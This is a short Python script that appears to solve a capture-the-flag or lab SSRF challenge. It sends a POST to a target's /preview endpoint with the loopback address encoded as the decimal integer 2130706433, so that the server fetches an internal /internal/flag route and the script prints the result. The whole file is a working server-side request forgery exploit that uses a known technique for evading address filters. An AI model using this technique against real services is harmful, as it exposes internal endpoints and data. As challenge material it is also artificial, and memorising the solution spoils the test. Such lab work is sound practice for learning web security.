import sys
import requests

def main():
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:5000"


    ssrf_url = "http://2130706433:5000/internal/flag"

    r = requests.post(
        f"{base}/preview",
        json={"url": ssrf_url},
        timeout=5,
    )
    r.raise_for_status()
    data = r.json()

    
    print(data)

if __name__ == "__main__":
    main()
